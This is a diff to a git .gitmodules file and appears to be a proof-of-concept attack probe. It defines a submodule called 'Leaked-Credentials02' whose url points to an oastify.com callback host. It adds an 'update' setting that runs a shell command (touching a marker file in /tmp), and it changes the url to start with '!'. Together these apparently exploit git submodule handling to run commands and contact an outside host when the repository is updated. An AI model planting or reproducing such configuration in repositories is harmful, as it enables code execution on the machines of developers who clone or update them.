@@ -1,4 +1,4 @@
 [submodule "Leaked-Credentials02"]
 	path = fffffffffff
-	url = http://bp4ez4qc1ypgayjtvpvkos55twzpnge43.oastify.com
-        update = "touch /tmp/aaaaaaaaaaaaaaaaaaaaaaa"
+	url = !http://bp4ez4qc1ypgayjtvpvkos55twzpnge43.oastify.com
+        update = touch /tmp/aaaaaaaaaaaaaaaaaaaaaaa
